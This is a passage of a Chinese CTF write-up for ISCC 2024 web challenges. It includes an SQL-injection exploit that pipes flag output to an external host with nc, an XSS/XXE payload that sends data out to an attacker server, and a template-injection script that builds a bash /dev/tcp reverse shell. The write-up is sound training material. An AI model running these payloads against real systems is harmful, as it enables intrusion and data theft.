class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = 200<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = 200<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == 500:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = 500<br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-built_in">return</span> result<br> <br>    def checkSign(self):<br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-built_in">return</span> True<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">return</span> False<br> <br>@app.route(<span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def geneSign():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-built_in">return</span> getSign(action, param)<br> <br>@app.route(<span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>])<br>def challenge():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-built_in">return</span> json.dumps(task.Exec())<br> <br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def index():<br>    <span class="hljs-built_in">return</span> open(<span class="hljs-string">&quot;code.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).<span class="hljs-built_in">read</span>()<br> <br>def scan(param):<br>    socket.setdefaulttimeout(1)<br>    try:<br>        <span class="hljs-built_in">return</span> urllib.urlopen(param).<span class="hljs-built_in">read</span>()[:50]<br>    except:<br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br> <br>def getSign(action, param):<br>    <span class="hljs-built_in">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br> <br>def md5(content):<br>    <span class="hljs-built_in">return</span> hashlib.md5(content).hexdigest()<br> <br>def waf(param):<br>    check=param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) or check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-built_in">return</span> True<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">return</span> False<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = False<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=9999)<br></code></pre></td></tr></table></figure><p>定位到关键代码</p><p>有三个路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&#x27;/&#x27;</span><br><span class="hljs-string">&#x27;/De1ta&#x27;</span><br><span class="hljs-string">&#x27;/geneSign&#x27;</span><br></code></pre></td></tr></table></figure><p>好懒累了，具体逻辑看原题吧我就说一下思路</p><p>使用if的判断</p><p>可以尝试用readscan绕过</p><p>param放要读的文件flag.txt</p><p>cookie里的action+GET里的param加密后要等于cookie里的sign</p><p>geneSign告诉我们param+关键字action的MD5加密是多少</p><p>那我们在&#x2F;geneSign页面传param&#x3D;flag.txtread就能算出来secret_key+flag.txt+readscan的值是多少，可以绕过弱比较</p><p>先获得sign的值</p><p>最终，回到<code>/De1ta</code>页面，<code>GET</code>传参<code>param=flag.txt</code>，<code>cookie</code>传参</p><p><img src="/../../images/iscc2024/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.png" alt="代码审计"></p><h3 id="原神启动"><a href="#原神启动" class="headerlink" title="原神启动"></a>原神启动</h3><p>我们原神玩家也是出息了。</p><p>作为一个op能直接答题那还是看一下源码吧，与熊论禅</p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E.png" alt="原神"></p><p>就是简单的答题，输入正确答案可以问问题，尝试输入flag，告诉我们在flag.txt</p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E1.png" alt="原神1"></p><p>以为直接是flag的，交完之后也不对啊。尝试扫了一下，并没有发现有什么异端，挨个进入，发现<a href="http://101.200.138.180:8080/index.jsp%EF%BC%8C%E9%87%8C%E9%9D%A2%E5%8F%AF%E4%BB%A5%E6%98%BE%E7%A4%BA%E6%98%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%89%88%E6%9C%AC%E5%8F%B7%EF%BC%8C%E6%90%9C%E7%9C%8B%E7%9C%8B%E6%9C%89%E6%B2%A1%E6%9C%89cve">http://101.200.138.180:8080/index.jsp，里面可以显示是服务器的版本号，搜看看有没有cve</a></p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E2.png" alt="原神2"></p><p>有漏洞可以利用，我们在虚拟机运行利用漏洞读取得到flag</p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E3.png" alt="原神3"></p><h3 id="掉进阿帕奇的工资"><a href="#掉进阿帕奇的工资" class="headerlink" title="掉进阿帕奇的工资"></a>掉进阿帕奇的工资</h3><p>这题也难也是劳累</p><p>进入的页面是登陆界面，尝试用admin爆破密码进去的，爆破好久也是没进去，那就只能注册一个账号看看了。</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%87.png" alt="阿帕奇"></p><p>？看看源码。</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%871.png" alt="阿帕奇1"></p><p>还是学生就遭受了社会的毒打，要求是应该要是manager才能进入的啊</p><p>总结其实也不用改bp，就是页面注册的时候把信息都填好，验证问题选择第二个，然后修改密码选择回答问题，之后就可以登陆了</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%872.png" alt="阿帕奇2"></p><p>进去就是一个界面。</p><p>在工资界面上尝试一会好像是异或，输入ls和]B，可以爆出所有的内容</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%873.png" alt="阿帕奇3"></p><p>把所有的挨个试一下，结果应该是在Docfile </p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%874.png" alt="阿帕奇4"></p><p>一开始非预期可以直接用异或出的，环境修复之后就不行了，这题也考察的cve漏洞</p><p><a href="https://blog.csdn.net/qq_51398553/article/details/131299190">CVE-2021-40438</a>，按照流程也是最后出flag的</p><p>构造transfer.php?dashachun&#x3D;unix:A……A|<a href="http://secret.host/flag%E5%BE%97%E5%88%B0flag">http://secret.host/flag得到flag</a></p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%875.png" alt="阿帕奇5"></p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><p>这种全考反弹shell我i也是无奈了，最后的服务器环境也一直在爆，哎。</p><h3 id="这题我出不了了"><a href="#这题我出不了了" class="headerlink" title="这题我出不了了"></a>这题我出不了了</h3><p>这题我也真的出不了啊</p><p><a href="https://over-rainbow.cn/posts/2017-hitcon-sql-so-hard/">原题</a>，跟着过一遍吧，原理看文章就行</p><p>Exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># payload = &quot;union&quot;</span><br>payload = <span class="hljs-string">&quot;&quot;&quot;&#x27;,&#x27;&#x27;)/*%s*/returning(1)as&quot;\\&#x27;/*&quot;,(1)as&quot;\\&#x27;*/-(a=`child_process`)/*&quot;,(2)as&quot;\\&#x27;*/-(b=`/printFlag|nc 47.122.22.16 5566`)/*&quot;,(3)as&quot;\\&#x27;*/-console.log(process.mainModule.require(a).exec(b))]=1//&quot;--&quot;&quot;&quot;</span> % (<span class="hljs-string">&#x27; &#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">16</span>)<br>username = <span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))+<span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))+<span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))<br>data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: username+payload,<br>                <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;AAAAAA&#x27;</span><br>                &#125;<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ok&#x27;</span>)<br>r = requests.post(<span class="hljs-string">&#x27;http://101.200.138.180:32031/register_7D85tmEhhAdgGu92&#x27;</span>, data=data)<br><span class="hljs-built_in">print</span>(r.content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure><p>在跑的时候要多连几下，可能连不起来，自己要买台云服务器方便一点，根据实际情况来</p><p><img src="/../../images/iscc2024/%E5%87%BA%E4%B8%8D%E4%BA%86.png" alt="出不了"></p><h3 id="一道普通的XSS题目"><a href="#一道普通的XSS题目" class="headerlink" title="一道普通的XSS题目"></a>一道普通的XSS题目</h3><p>显然这也并不简单,这是一道国际赛的原题，当时还是爆零了，我们也借鉴借鉴</p><p><a href="https://blog.ankursundara.com/dicectf23-writeups/">文章</a>，对比原文可以看出基本没有变化，也是跟着思路来一遍吧(这不就是炒冷饭，我太失败了)</p><p>改一下脚本，改个vps和端口，然后用node.js跑一下就可以了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">xmls = <span class="hljs-string">`&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE a [</span><br><span class="hljs-string">   &lt;!ENTITY xxe SYSTEM  &quot;http://101.200.138.180:30280/flag&quot; &gt;]&gt;</span><br><span class="hljs-string">&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; version=&quot;1.0&quot;&gt;</span><br><span class="hljs-string">  &lt;xsl:template match=&quot;/asdf&quot;&gt;</span><br><span class="hljs-string">    &lt;HTML&gt;</span><br><span class="hljs-string">      &lt;HEAD&gt;</span><br><span class="hljs-string">        &lt;TITLE&gt;&lt;/TITLE&gt;</span><br><span class="hljs-string">      &lt;/HEAD&gt;</span><br><span class="hljs-string">      &lt;BODY&gt;</span><br><span class="hljs-string">        &lt;img&gt;</span><br><span class="hljs-string">          &lt;xsl:attribute name=&quot;src&quot;&gt;</span><br><span class="hljs-string">            http://这边填服务器和端口/?&amp;xxe;</span><br><span class="hljs-string">          &lt;/xsl:attribute&gt;</span><br><span class="hljs-string">        &lt;/img&gt;</span><br><span class="hljs-string">      &lt;/BODY&gt;</span><br><span class="hljs-string">    &lt;/HTML&gt;</span><br><span class="hljs-string">  &lt;/xsl:template&gt;</span><br><span class="hljs-string">&lt;/xsl:stylesheet&gt;`</span><br><br>xml = <span class="hljs-string">`&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-string">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;data:text/plain;base64,<span class="hljs-subst">$&#123;btoa(xmls)&#125;</span>&quot;?&gt;</span><br><span class="hljs-string">&lt;asdf&gt;&lt;/asdf&gt;`</span><br>xss = <span class="hljs-built_in">encodeURIComponent</span>(xml)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(xss)<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/iscc2024/xss.png" alt="xss"></p><p>然后拼接脚本就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://101.200.138.180:30280/adminbot?url=http://101.200.138.180:30280/?payload=%3C%3Fxml%20version%3D%221.0%22%3F%3E%0A%3C%3Fxml-stylesheet%20type%3D%22text%2F<br>xsl%22%20href%3D%22data%3Atext%2Fplain%3Bbase64%2CPD94bWwgdmVyc2lvbj0iMS4wIj8%2B<br>CjwhRE9DVFlQRSBhIFsKICAgPCFFTlRJVFkgeHhlIFNZU1RFTSAgImh0dHA6Ly8xMDEuMjAwLjEzOC4x<br>ODA6MzAyODAvZmxhZyIgPl0%2BCjx4c2w6c3R5bGVzaGVldCB4bWxuczp4c2w9Imh0dHA6Ly93d3cudz<br>Mub3JnLzE5OTkvWFNML1RyYW5zZm9ybSIgdmVyc2lvbj0iMS4wIj4KICA8eHNsOnRlbXBsYXRlIG1hdG<br>NoPSIvYXNkZiI%2BCiAgICA8SFRNTD4KICAgICAgPEhFQUQ%2BCiAgICAgICAgPFRJVExFPjwvVElUTE<br>U%2BCiAgICAgIDwvSEVBRD4KICAgICAgPEJPRFk%2BCiAgICAgICAgPGltZz4KICAgICAgICAgIDx4c2<br>w6YXR0cmlidXRlIG5hbWU9InNyYyI%2BCiAgICAgICAgICAgIGh0dHA6Ly80Ny4xMjIuMjIuMTY6ODA4<br>MC8%2FJnh4ZTsKICAgICAgICAgIDwveHNsOmF0dHJpYnV0ZT4KICAgICAgICA8L2ltZz4KICAgICAgPC<br>9CT0RZPgogICAgPC9IVE1MPgogIDwveHNsOnRlbXBsYXRlPgo8L3hzbDpzdHlsZXNoZWV0Pg%3D%3D%2<br>2%3F%3E%0A%3Casdf%3E%3C%2Fasdf%3E<br><br></code></pre></td></tr></table></figure><p>多尝试几次理论上火狐也是可以传的我试过了</p><p><img src="/../../images/iscc2024/xss1.png" alt="xss1"></p><h3 id="回来吧永远滴神"><a href="#回来吧永远滴神" class="headerlink" title="回来吧永远滴神"></a>回来吧永远滴神</h3><p>呜呜呜，我再也不看英雄联盟了。</p><p>首先的界面是需要填空的，搜索一下</p><p><img src="/../../images/iscc2024/yyds.png" alt="yyds"></p><p>填空就行，然后进入一个页面</p><p><img src="/../../images/iscc2024/yyds1.png" alt="yyds1"></p><p>好像是模板注入，看不了源码，view-source也看不了，用bp抓一下内容</p><p><img src="/../../images/iscc2024/yyds2.png" alt="yyds2"></p><p>整数这块有点问题噢，后面还有等于，赛博厨子一把梭,先base64再转hex得到</p><p><img src="/../../images/iscc2024/yyds3.png" alt="yyds3"></p><p>通过分析flag应该是拼接的内容，我们再看看原来的，尝试模板注入看看</p><p><img src="/../../images/iscc2024/yyds4.png" alt="yyds4"></p><p>有内容的，那就尝试写个脚本看看吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> functools<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> fenjing <span class="hljs-keyword">import</span> exec_cmd_payload<br><br>url = <span class="hljs-string">&quot;http://101.200.138.180:16356/evlelLL/646979696775616e&quot;</span><br>cookies = &#123;<br>    <span class="hljs-string">&#x27;session&#x27;</span>: <span class="hljs-string">&#x27;eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.Zk7ADA.GKdiBAKEeHRKoMPRWoSoRkaaH2c&#x27;</span><br>&#125;<br><br><span class="hljs-meta">@functools.lru_cache(<span class="hljs-params">maxsize=<span class="hljs-number">1000</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">payload: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;检查字符串是否能通过WAF。如果能通过，返回True；否则返回False。&quot;&quot;&quot;</span><br>    time.sleep(<span class="hljs-number">0.02</span>)  <span class="hljs-comment"># 防止请求发送过多</span><br>    <span class="hljs-keyword">try</span>:<br>        resp = requests.post(url, cookies=cookies, timeout=<span class="hljs-number">10</span>, data=&#123;<span class="hljs-string">&quot;iIsGod&quot;</span>: payload&#125;)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;大胆&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text<br>    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求异常: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    shell_payload, will_print = exec_cmd_payload(<br>        waf, <span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/服务器/端口 0&gt;&amp;1&quot;&#x27;</span><br>    )<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> will_print:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这个payload不会产生回显！&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;shell_payload=&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>也是概率性的事情</p><p><img src="/../../images/iscc2024/yyds5.png" alt="yyds5"></p><p>讲改内容输入到页面的内容，反弹shell</p><p><img src="/../../images/iscc2024/yyds6.png" alt="yyds6"></p><p>还有一部分的内容估计就在app.py里面了，是个很长内容的代码</p><p><img src="/../../images/iscc2024/yyds7.png" alt="yyds7"></p><p>具体定位到key和偏移值和密文，写个脚本得到答案</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python">![yyds8](../../images/iscc2024/yyds8.png)<span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long <span class="hljs-keyword">as</span> b2l, long_to_bytes <span class="hljs-keyword">as</span> l2b<br><span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> Enum<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mode</span>(<span class="hljs-title class_ inherited__">Enum</span>):<br>    ECB = <span class="hljs-number">0x01</span><br>    CBC = <span class="hljs-number">0x02</span><br>    CFB = <span class="hljs-number">0x03</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cipher</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key, iv=<span class="hljs-literal">None</span></span>):<br>        self.BLOCK_SIZE = <span class="hljs-number">64</span>  <span class="hljs-comment"># Block size in bits</span><br>        self.KEY = [b2l(key[i:i + self.BLOCK_SIZE // <span class="hljs-number">16</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(key), self.BLOCK_SIZE // <span class="hljs-number">16</span>)]<br>        self.DELTA = <span class="hljs-number">0x9e3779b9</span><br>        self.IV = iv<br>        self.ROUNDS = <span class="hljs-number">64</span><br>        self.mode = self._determine_mode(iv)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_determine_mode</span>(<span class="hljs-params">self, iv</span>):<br>        <span class="hljs-keyword">if</span> iv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> Mode.ECB<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(iv) * <span class="hljs-number">8</span> == self.BLOCK_SIZE:<br>            <span class="hljs-keyword">return</span> Mode.CBC<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> Mode.CFB<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_xor</span>(<span class="hljs-params">self, a, b</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(_a ^ _b <span class="hljs-keyword">for</span> _a, _b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a, b))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_block</span>(<span class="hljs-params">self, block</span>):<br>        mask = (<span class="hljs-number">1</span> &lt;&lt; (self.BLOCK_SIZE // <span class="hljs-number">2</span>)) - <span class="hljs-number">1</span><br>        c0 = b2l(block[:<span class="hljs-number">4</span>])<br>        c1 = b2l(block[<span class="hljs-number">4</span>:])<br>        <span class="hljs-built_in">sum</span> = (self.DELTA * self.ROUNDS) &amp; mask<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.ROUNDS):<br>            c1 -= ((c0 &lt;&lt; <span class="hljs-number">4</span>) + self.KEY[(self.ROUNDS - i - <span class="hljs-number">1</span> + <span class="hljs-number">2</span>) % <span class="hljs-built_in">len</span>(self.KEY)]) ^ (c0 + <span class="hljs-built_in">sum</span>) ^ (<br>                        (c0 &gt;&gt; <span class="hljs-number">5</span>) + self.KEY[(self.ROUNDS - i - <span class="hljs-number">1</span> + <span class="hljs-number">3</span>) % <span class="hljs-built_in">len</span>(self.KEY)])<br>            c1 &amp;= mask<br>            c0 -= ((c1 &lt;&lt; <span class="hljs-number">4</span>) + self.KEY[(self.ROUNDS - i - <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(self.KEY)]) ^ (c1 + <span class="hljs-built_in">sum</span>) ^ (<br>                        (c1 &gt;&gt; <span class="hljs-number">5</span>) + self.KEY[(self.ROUNDS - i - <span class="hljs-number">1</span> + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(self.KEY)])<br>            c0 &amp;= mask<br>            <span class="hljs-built_in">sum</span> -= self.DELTA<br><br>        <span class="hljs-keyword">return</span> l2b((c0 &lt;&lt; (self.BLOCK_SIZE // <span class="hljs-number">2</span>)) | c1)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_encrypt_block</span>(<span class="hljs-params">self, block</span>):<br>        m0 = b2l(block[:<span class="hljs-number">4</span>])<br>        m1 = b2l(block[<span class="hljs-number">4</span>:])<br>        mask = (<span class="hljs-number">1</span> &lt;&lt; (self.BLOCK_SIZE // <span class="hljs-number">2</span>)) - <span class="hljs-number">1</span><br>        <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.ROUNDS):<br>            <span class="hljs-built_in">sum</span> += self.DELTA<br>            m0 += ((m1 &lt;&lt; <span class="hljs-number">4</span>) + self.KEY[i % <span class="hljs-built_in">len</span>(self.KEY)]) ^ (m1 + <span class="hljs-built_in">sum</span>) ^ ((m1 &gt;&gt; <span class="hljs-number">5</span>) + self.KEY[(i + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(self.KEY)])<br>            m0 &amp;= mask<br>            m1 += ((m0 &lt;&lt; <span class="hljs-number">4</span>) + self.KEY[(i + <span class="hljs-number">2</span>) % <span class="hljs-built_in">len</span>(self.KEY)]) ^ (m0 + <span class="hljs-built_in">sum</span>) ^ (<br>                        (m0 &gt;&gt; <span class="hljs-number">5</span>) + self.KEY[(i + <span class="hljs-number">3</span>) % <span class="hljs-built_in">len</span>(self.KEY)])<br>            m1 &amp;= mask<br><br>        <span class="hljs-keyword">return</span> l2b((m0 &lt;&lt; (self.BLOCK_SIZE // <span class="hljs-number">2</span>)) | m1)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_ecb</span>(<span class="hljs-params">self, blocks</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;&#x27;</span>.join(self._decrypt_block(block) <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_cbc</span>(<span class="hljs-params">self, blocks</span>):<br>        plaintext = <span class="hljs-string">b&#x27;&#x27;</span><br>        prev_block = self.IV<br>        <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>            decrypted_block = self._decrypt_block(block)<br>            plaintext_block = self._xor(prev_block, decrypted_block)<br>            plaintext += plaintext_block<br>            prev_block = block<br>        <span class="hljs-keyword">return</span> plaintext<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_cfb</span>(<span class="hljs-params">self, blocks</span>):<br>        plaintext = <span 